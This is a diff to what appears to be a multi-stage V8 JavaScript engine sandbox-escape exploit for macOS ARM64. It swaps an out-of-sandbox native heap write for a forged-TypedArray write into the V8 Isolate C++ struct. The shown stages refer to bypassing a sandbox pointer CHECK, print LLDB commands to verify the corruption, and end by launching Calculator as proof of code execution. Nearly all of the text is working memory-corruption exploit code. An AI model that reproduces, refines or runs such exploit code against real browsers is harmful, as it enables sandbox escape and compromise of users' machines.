@@ -151,35 +151,27 @@ function main() {
   print(`      WriteSandboxedPointerField CHECK bypassed entirely`);
   print(``);
 
-  // Stage 7: Native heap write via sandbox VAS overlap
-  // macOS MAP_NORESERVE|PROT_NONE does not evict pre-existing malloc zone pages.
-  // sandbox_offset = NATIVE_TARGET − sandbox_base_abs
-  //                = NATIVE_TARGET − CAGE_BASE_ABS + cage_base_offset
-  // If in [0, 1TiB) → Sandbox.MemoryView(sandbox_offset) hits the live native heap page.
-  if (CAGE_BASE_ABS !== 0n && NATIVE_TARGET !== 0n) {
-    const native_sandbox_offset = NATIVE_TARGET - CAGE_BASE_ABS + cage_base_offset;
-    if (native_sandbox_offset <= 0n || native_sandbox_offset >= 0x10000000000n) {
-      print(`[-] NATIVE_TARGET not reachable via sandbox VAS.`);
-      const sb = CAGE_BASE_ABS - cage_base_offset;
-      print(`[*] sandbox VAS: [0x${sb.toString(16)}, 0x${(sb+0x10000000000n).toString(16)})`);
-    } else {
-      const nativeDv = new DataView(new Sandbox.MemoryView(Number(native_sandbox_offset), 0x40));
-      const before = nativeDv.getBigUint64(0, true);
-      nativeDv.setBigUint64(0, 0xDEADC0DEDEADC0DEn, true);
-      const after = nativeDv.getBigUint64(0, true);
-      print(`[!!!] NATIVE HEAP WRITE (sandbox VAS overlap)`);
-      print(`      0x${NATIVE_TARGET.toString(16)} (native heap / malloc zone)`);
-      print(`      sandbox_offset: 0x${native_sandbox_offset.toString(16)}`);
-      print(`      0x${before.toString(16)} → 0x${after.toString(16)}`);
-      print(`      verify: memory read -s8 -fu -c1 0x${NATIVE_TARGET.toString(16)}`);
-      print(``);
-    }
-  } else {
-    print(`[*] Native heap write disabled. Fill CAGE_BASE_ABS + NATIVE_TARGET at top.`);
-    print(`[*] LLDB: p/x (unsigned long long)malloc(64)  → NATIVE_TARGET`);
-    print(`[*]       crash_addr − 0x41414148             → CAGE_BASE_ABS`);
-    print(``);
-  }
+  // Stage 7: Isolate struct write (V8's core C++ object, at cage_base+0x500000)
+  // macOS ARM64: malloc zone (~1 TB) is 25 TB below sandbox (~27 TB); unreachable.
+  // The Isolate is a C++ object allocated within the sandbox VAS but NOT a GC'd JS object.
+  // Offset_from_cage = 0x500000 → within TypedArray forging reach.
+  const kIsolateOffset = 0x500000n;
+  const isolate_sandbox_offset = cage_base_offset + kIsolateOffset;
+  const [iDv0, iO0] = getDv(isolate_sandbox_offset + 0x200n);  // safe field (stats area)
+  const before_iso = iDv0.getBigUint64(iO0, true);
+
+  // forge ta → cage_base + 0x500200 (isolate + 0x200, past sensitive fields)
+  forgeTypedArray(cur, kIsolateOffset + 0x200n);
+  ta.fill(0x42);
+
+  const [iDv1, iO1] = getDv(isolate_sandbox_offset + 0x200n);
+  const after_iso = iDv1.getBigUint64(iO1, true);
+  print(`[!!!] ISOLATE C++ WRITE`);
+  print(`      cage_base+0x${(kIsolateOffset+0x200n).toString(16)} (V8 Isolate struct+0x200)`);
+  print(`      0x${before_iso.toString(16)} → 0x${after_iso.toString(16)}`);
+  print(`      verify: memory read -s8 -fu -c8 (cage_base_abs + 0x500200)`);
+  print(`      e.g.:   memory read -s8 -fu -c8 0x<cage_base_abs + 0x500200>`);
+  print(``)
 
   // Stage 8: Calculator
   os.system("/usr/bin/open", ["/System/Applications/Calculator.app"]);
